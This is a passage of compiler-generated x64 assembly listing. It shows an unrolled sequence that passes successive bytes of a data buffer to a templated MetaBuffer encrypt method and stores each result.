  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
